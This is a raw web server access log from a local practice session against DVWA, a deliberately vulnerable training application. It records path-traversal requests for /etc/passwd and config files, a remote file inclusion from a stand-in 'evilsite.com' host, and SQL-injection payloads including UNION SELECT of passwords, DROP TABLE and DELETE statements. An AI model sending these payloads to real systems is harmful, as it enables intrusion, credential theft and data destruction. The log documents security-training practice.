0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:36 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4311 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:37 +0000] "GET /dvwa/vulnerabilities/csrf/ HTTP/1.1" 200 4712 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:33:32 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=csrf&security=low HTTP/1.1" 200 1469 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:38:17 +0000] "GET /dvwa/vulnerabilities/captcha/ HTTP/1.1" 200 5095 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:38:18 +0000] "GET /dvwa/vulnerabilities/captcha/ HTTP/1.1" 200 5095 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:39:31 +0000] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 4219 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:39:41 +0000] "GET /dvwa/vulnerabilities/fi/?page=php.ini HTTP/1.1" 200 3804 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:39:49 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../php.ini HTTP/1.1" 200 3783 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:39:54 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../php.ini HTTP/1.1" 200 3813 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:39:58 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../php.ini HTTP/1.1" 200 3783 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:15 +0000] "GET /dvwa/vulnerabilities/fi/?page=index.php HTTP/1.1" 200 217 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:18 +0000] "GET /dvwa/ HTTP/1.1" 200 4617 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:19 +0000] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 4219 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:20 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low HTTP/1.1" 200 1458 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:29 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:46 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/init.d/default HTTP/1.1" 200 3833 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:51 +0000] "GET /dvwa/vulnerabilities/fi/?page=index.php HTTP/1.1" 200 217 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:54 +0000] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 4219 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:40:55 +0000] "GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1" 200 4219 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:41:05 +0000] "GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1" 200 195 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:41:28 +0000] "GET /dvwa/vulnerabilities/fi/?page=../php.ini HTTP/1.1" 200 3807 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:41:37 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../php.ini HTTP/1.1" 200 3783 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:41:59 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../config/config.php.ini HTTP/1.1" 200 3824 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:42:03 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../config/config.ini.php HTTP/1.1" 200 3824 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:42:09 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../config/config.inc.php HTTP/1.1" 200 3635 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:42:14 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../config/config.inc.php HTTP/1.1" 200 3635 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:42:15 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../config/config.inc.php HTTP/1.1" 200 3635 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:42:45 +0000] "GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1" 200 195 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:42:50 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:00 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1" 200 1305 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:05 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=fi HTTP/1.1" 200 3473 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:13 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:17 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:21 +0000] "GET /dvwa/vulnerabilities/fi/?page=../etc/passwd HTTP/1.1" 200 3810 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:23 +0000] "GET /dvwa/vulnerabilities/fi/?page=/etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:51 +0000] "GET /dvwa/vulnerabilities/fi/?page=/etc/groups HTTP/1.1" 200 3808 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:43:55 +0000] "GET /dvwa/vulnerabilities/fi/?page=/etc/init.d/apache HTTP/1.1" 200 3815 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:44:33 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../php.ini HTTP/1.1" 200 3783 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:07 +0000] "GET /dvwa/vulnerabilities/fi/?page=/etc/passwords HTTP/1.1" 200 3811 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:10 +0000] "GET /dvwa/vulnerabilities/fi/?page=/etc/password HTTP/1.1" 200 3810 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:18 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../..//etc/password HTTP/1.1" 200 3831 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:19 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../..//etc/passwords HTTP/1.1" 200 3832 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:22 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwords HTTP/1.1" 200 3831 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:23 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../../etc/password HTTP/1.1" 200 3830 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:28 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low HTTP/1.1" 200 1458 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:35 +0000] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:47:42 +0000] "GET /dvwa/vulnerabilities/fi/?page=/etc/passwd HTTP/1.1" 200 8597 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:49:17 +0000] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:49:19 +0000] "GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1" 200 4776 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:49:20 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=sqli_blind&security=low HTTP/1.1" 200 1814 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:49:54 +0000] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:49:56 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=sqli&security=low HTTP/1.1" 200 1834 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:50:14 +0000] "GET /dvwa/vulnerabilities/sqli/?id=a%27+or+%27a%27+%3D+%27a%27%23&Submit=Submit HTTP/1.1" 200 5058 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:50:21 +0000] "GET /dvwa/vulnerabilities/sqli/?id=a%27+or+%27a%27+%3D+%27a&Submit=Submit HTTP/1.1" 200 5048 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:50:25 +0000] "GET /dvwa/vulnerabilities/sqli/?id=a%27+or+%27a%27+%3D+%27a%27%23&Submit=Submit HTTP/1.1" 200 5058 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:51:03 +0000] "GET /dvwa/vulnerabilities/sqli/?id=a%27+or+%27a%27+%3D+%27a&Submit=Submit HTTP/1.1" 200 5048 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:51:40 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+or+1+%3D%3D+1%23&Submit=Submit HTTP/1.1" 200 163 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:51:53 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D%3D+%271%27%23&Submit=Submit HTTP/1.1" 200 165 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:52:01 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27%23&Submit=Submit HTTP/1.1" 200 5058 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:52:10 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27%3B+DELETE+FROM+USER%3B%23&Submit=Submit HTTP/1.1" 200 176 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:52:26 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27%3B+SELECT+*+FORM+USER%3B%23&Submit=Submit HTTP/1.1" 200 178 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:52:30 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=sqli&security=low HTTP/1.1" 200 3298 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:52:47 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27%3B+DELETE+FROM+USERS%3B%23&Submit=Submit HTTP/1.1" 200 177 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:53:16 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3B+DROP+TABLE+users%3B%23&Submit=Submit HTTP/1.1" 200 176 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:55:00 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3B+DROP+users%23&Submit=Submit HTTP/1.1" 200 169 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:55:46 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3B&Submit=Submit HTTP/1.1" 200 158 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:55:48 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3B%23&Submit=Submit HTTP/1.1" 200 4769 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:55:54 +0000] "GET /dvwa/vulnerabilities/sqli/?id=2%27%3B%23&Submit=Submit HTTP/1.1" 200 4770 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:55:58 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3B%23&Submit=Submit HTTP/1.1" 200 4769 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:56:24 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3BSELECT+first_name%2C+last_name+FROM+users+WHERE+user_id+%3D+%272%27%3B&Submit=Submit HTTP/1.1" 200 218 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:56:41 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3BSELECT+first_name%2C+last_name+FROM+users+WHERE+user_id+%3D+%272%27%3B%23&Submit=Submit HTTP/1.1" 200 219 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:07:46 +0000] "GET /dvwa/vulnerabilities/sqli/?id=UNION+SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES&Submit=Submit HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:08:04 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES%23&Submit=Submit HTTP/1.1" 200 202 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:08:51 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+password+FROM+users%23&Submit=Submit HTTP/1.1" 200 72 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:09:03 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+password%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1" 200 5422 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:11:32 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+username%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1" 200 52 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:11:41 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+first_name%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1" 200 5450 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:12:10 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+password%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1" 200 5422 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:13:14 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1" 200 5418 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:13:55 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=sqli&security=low HTTP/1.1" 200 3298 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:13:56 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=sqli HTTP/1.1" 200 8900 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:14:47 +0000] "GET /dvwa/vulnerabilities/upload/ HTTP/1.1" 200 4652 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:14:49 +0000] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4453 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:15:14:51 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=xss_r&security=low HTTP/1.1" 200 1997 
